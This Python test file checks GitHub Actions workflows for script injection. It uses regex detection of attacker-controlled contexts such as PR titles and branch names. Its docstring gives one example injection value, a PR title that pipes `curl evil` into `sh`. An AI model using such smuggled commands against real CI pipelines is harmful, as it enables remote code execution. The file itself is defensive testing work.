"""No script of a workflow interpolates input an outsider writes (.coderabbit.yaml, workflows; #513).

`${{ ... }}` in a `run:` script (or an actions/github-script `script:`) is pasted into the script before it runs, so
a PR title such as `a"; curl evil | sh; "` would run. Such a value goes through `env:` and is read as `"$VALUE"`.
The contexts refused are the ones GitHub lists as attacker-controlled: titles, bodies, comments, commit messages and
authors, branch names of a PR or of a workflow run, and the event as a whole (`toJSON(github.event)`, bracket
access), in any case. Values set by a maintainer (a release's tag, a dispatch's branch) are not refused here. No
exception. What it cannot see: such a value put in `env:` and read back as `${{ env.X }}` rather than `"$X"`.
"""

import re

from helpers.workflows import LOCAL_ACTIONS, WORKFLOWS, scripts

_PARTS = r"(?:issue|pull_request|discussion|comment|review|review_comment|pages|commits|head_commit|workflow_run)"
UNTRUSTED = re.compile(
    r"github\.head_ref"
    r"|github\.event\.(?:issue|pull_request|discussion)\.(?:title|body)"
    r"|github\.event\.(?:comment|review|review_comment)\.body"
    r"|github\.event\.pages\b"
    r"|github\.event\.(?:commits|head_commit)\b"
    r"|github\.event\.pull_request\.head\.(?:ref|label|repo\.default_branch)"
    r"|github\.event\.workflow_run\.(?:head_branch|head_commit|display_title|pull_requests)"
    r"|github\.event(?:\.\w+)*\s*\["
    rf"|toJSON\(\s*github(?:\.event(?:\.{_PARTS})?)?\s*\)",
    # Contexts and functions are case-insensitive in GitHub's expressions.
    re.IGNORECASE,
)
_EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.DOTALL)


def untrusted_in(script: list[str]) -> list[tuple[int, str]]:
    """The (line offset, expression) of each `${{ }}` in the script that reads an untrusted context."""
    text = "\n".join(script)
    return [
        (text.count("\n", 0, match.start()), " ".join(match[1].split()))
        for match in _EXPRESSION.finditer(text)
        if UNTRUSTED.search(match[1])
    ]


def test_the_scripts_are_found() -> None:
    # Without this, a change in how scripts are written would leave the test below with nothing to check.
    found = [script for path in [*WORKFLOWS, *LOCAL_ACTIONS] for script in scripts(path)]
    assert len(found) >= 10, f"found {len(found)} run: scripts under .github/"


def test_no_script_interpolates_untrusted_input() -> None:
    found = [
        f"{script.where(offset)}: ${{{{ {expression} }}}}"
        for path in [*WORKFLOWS, *LOCAL_ACTIONS]
        for script in scripts(path)
        for offset, expression in untrusted_in(script.lines)
    ]
    assert found == [], (
        "pass these through the step's env: (`env: TITLE: ${{ github.event.pull_request.title }}`) and read them "
        'as "$TITLE" in the script:\n' + "\n".join(found)
    )


def test_the_check_finds_untrusted_input() -> None:
    script = [
        'echo "${{ github.event.pull_request.title }}"',
        'echo "${{ github.event_name }}" "${{ github.event.release.tag_name }}"',
        "git checkout ${{ github.head_ref }}",
        "echo '${{ toJSON(github.event.pull_request) }}' '${{ github.event['issue']['title'] }}'",
        "echo ${{",
        "  github.event.issue.body }}",
        "echo ${{ GitHub.Event.Pull_Request.Title }} ${{ github.event.pull_request['title'] }} ${{ toJson(github) }}",
    ]
    assert untrusted_in(script) == [
        (0, "github.event.pull_request.title"),
        (2, "github.head_ref"),
        (3, "toJSON(github.event.pull_request)"),
        (3, "github.event['issue']['title']"),
        (4, "github.event.issue.body"),
        (6, "GitHub.Event.Pull_Request.Title"),
        (6, "github.event.pull_request['title']"),
        (6, "toJson(github)"),
    ]
